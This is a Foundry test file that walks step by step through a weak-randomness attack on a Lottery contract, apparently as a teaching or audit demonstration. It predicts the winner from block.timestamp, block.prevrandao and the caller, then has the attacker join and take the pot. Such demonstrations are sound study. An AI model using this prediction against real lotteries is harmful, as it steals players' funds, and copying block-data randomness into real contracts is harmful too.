// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/Lottery.sol";

contract WeakRandomness is Test {
    Lottery lottery;
    address owner;
    address victim;
    address attacker;

    function setUp() public {
        console.log("=== SETUP ===");
        owner = makeAddr("bob");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        vm.deal(owner, 10 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);

        vm.prank(owner);
        lottery = new Lottery();
        console.log("  Lottery deployed\n");

        // Victim joins lottery
        vm.prank(victim);
        lottery.join{ value: 1 ether }();
    }

    function testWeakRandomnessAttack() public {
        console.log("=== WEAK RANDOMNESS ATTACK ===");
        address[] memory players = lottery.getPlayers();

        console.log("[STEP 0] Initial state");
        console.log("  Attacker balance:", attacker.balance / 1e18, "ETH\n");

        console.log("[STEP 1] Randomness prediction");
        console.log("  Attacker simulates randomness off-chain using block data");
        uint256 predicted = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, // predictable
                    block.prevrandao, // predictable
                    owner // owner calls pickWinner()
                )
            )
        ) % (players.length + 1); // +1 because attacker will join

        console.log("  Expected winner index:", predicted, "\n");
        assertEq(predicted, 1);

        console.log("[STEP 2] Attacker joins the lottery");
        console.log("  players[0] = victim,  players[1] = attacker\n");
        vm.prank(attacker);
        lottery.join{ value: 1 ether }();

        console.log("[STEP 3] Lottery owner executes pickWinner()");
        vm.prank(owner);
        lottery.pickWinner();

        // Confirm attacker won
        assertEq(lottery.winner(), attacker);
        assertEq(attacker.balance, 11 ether); // attacker wins 2 ETH pot
        console.log("  Attacker won the lottery");
        console.log("  Attacker balance:", attacker.balance / 1e18, "ETH");
    }
}
